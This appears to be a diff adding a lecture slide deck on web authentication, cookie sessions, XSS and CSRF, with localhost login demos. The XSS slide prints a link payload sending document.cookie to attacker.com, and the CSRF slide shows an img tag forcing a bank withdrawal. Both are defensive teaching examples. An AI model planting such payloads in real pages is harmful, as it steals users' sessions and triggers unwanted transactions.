@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Hypermedia/Backend/Sessions, login and state</title>
+<meta name="author" content="(Vittorio Zaccaria)"/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/css/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/css/theme/moon.css" id="theme"/>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-light.min.css"/>
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide"><h1 class="title">Hypermedia/Backend/Sessions, login and state</h1><h2 class="author">Vittorio Zaccaria</h2><p class="date">Created: 2020-01-27 Mon 11:03</p>
+</section>
+<script src="reveal-bundle.js"></script>
+
+<section>
+<section id="slide-a0">
+<h2 id="a0">Authentication</h2>
+</section>
+<section id="slide-a1">
+<h3 id="a1">Meaning</h3>
+<p>
+Proving or showing something to be true, genuine, or valid, e.g.:
+</p>
+
+<pre class="example">
+Hei, I am Bill Gates, transfer 1M$ to this bank account.
+</pre>
+
+<p>
+How can you trust that a message you receive is genuine?
+</p>
+
+</section>
+<section id="slide-a2">
+<h3 id="a2">Methods to do it in a web app</h3>
+<ul>
+<li>HTTP basic auth over HTTPS;</li>
+<li>Cookies and session management;</li>
+<li>Token in HTTP headers (e.g. OAuth 2.0 + JWT); <b>not discussed here</b></li>
+<li>Query Authentication with additional signature parameters; <b>not discussed here</b></li>
+
+</ul>
+
+</section>
+<section id="slide-a3">
+<h3 id="a3">HTTP basic auth over HTTPS</h3>
+
+<div class="figure">
+<p><img src="./images/auth_basic.png" alt="auth_basic.png" width="500px" class="center" />
+</p>
+</div>
+
+<ul>
+<li><a href="https://stackoverflow.com/questions/233507/how-to-log-out-user-from-web-site-using-basic-authentication">There is no easy way to log out the user</a> as the client will always send the Authorization header 
+(i.e., <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">his/her password</a>) in each subsequent request</li>
+
+<li>Server must validate on every subsequent request the credentials</li>
+
+</ul>
+
+</section>
+<section id="slide-a4">
+<h3 id="a4">Cookie session management</h3>
+
+<div class="figure">
+<p><img src="./images/auth_cookie.png" alt="auth_cookie.png" width="600px" class="center" />
+</p>
+</div>
+
+<ul>
+<li>A cookie can be a <b>Unique session identifier</b>: a number assigned by the server
+that can be used by it to map it back to a user</li>
+
+<li>Every request made to the same origin will contain that cookie in the <code>HTTP</code> request header</li>
+
+</ul>
+
+
+</section>
+<section id="slide-a7">
+<h3 id="a7">Cross site scripting (XSS)</h3>
+<ul>
+<li>Plain cookies are visible to all pages in the browser through <code>document.cookie</code>.</li>
+
+<li>XSS attacks try to steal this information. For example:
+
+<ul>
+<li><p>
+Attacker posts some html in a message to <code>www.megaforum.com</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre><code class="html" ><a href="#" 
+  onclick="window.location = 'http://attacker.com/stole.cgi?text=' 
+  + escape(document.cookie); return false;">Click here!</a>
+</code></pre>
+</div></li>
+
+<li>If another user of the forum clicks the link, all his/her cookies accessible
+from <code>www.megaforum.com</code> are sent to the attacker.</li>
+
+</ul></li>
+
+<li>Original server must issue <code>HttpOnly</code> cookies to avoid this.</li>
+
+</ul>
+
+</section>
+<section id="slide-a8">
+<h3 id="a8">Cross site request forgery</h3>
+<p>
+On the same forum, if the attacker posts an image such as:
+</p>
+
+<div class="org-src-container">
+
+<pre><code class="html" ><img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"> 
+</code></pre>
+</div>
+
+<p>
+this could trigger the transaction for a viewer authenticated (i.e., with a
+cookie) with the bank.
+</p>
+
+<p>
+See <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md">this link for mitigations</a>. As a side note, OTP and or 
+additional codes are used from banks to mitigate this.
+</p>
+
+
+</section>
+</section>
+<section>
+<section id="slide-orgc35c58c">
+<h2 id="orgc35c58c">Introducing session state</h2>
+<div class="outline-text-2" id="text-orgc35c58c">
+</div>
+</section>
+<section id="slide-org6c12aff">
+<h3 id="org6c12aff">Demo D3.0 - Add a user with login and logout actions to the OpenAPI spec</h3>
+
+</section>
+<section id="slide-org0182279">
+<h3 id="org0182279">Demo D3.1 - Add cookie-session</h3>
+<ul>
+<li>Check with curl:</li>
+
+</ul>
+<div class="org-src-container">
+
+<pre><code class="shell" >curl -X POST --header 'Content-Type: application/x-www-form-urlencoded' --header 'Accept: application/json' -d 'username=1&password=1' 'http://localhost:8080/v2/user/login' -v
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org5f0b869">
+<h3 id="org5f0b869">Handson D3.2 - Add a <code>user/logout</code> endpoint</h3>
+</section>
+<section id="slide-org3f89771">
+<h3 id="org3f89771">Handson D3.3 - Add a <code>user/register</code> endpoint</h3>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/lib/js/head.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/js/reveal.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+controls: true,
+progress: true,
+history: true,
+center: true,
+slideNumber: 'c',
+rollingLinks: false,
+keyboard: true,
+overview: true,
+
+theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+transition: Reveal.getQueryHash().transition || 'fade', // default/cube/page/concave/zoom/linear/fade/none
+transitionSpeed: 'default',
+multiplex: {
+    secret: '', // null if client
+    id: '', // id, obtained from socket.io server
+    url: '' // Location of socket.io server
+},
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'https://cdnjs.cloudflare.com/ajax/libs/reveal.js/3.7.0/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }]
+});
+</script>
+</body>
+</html>
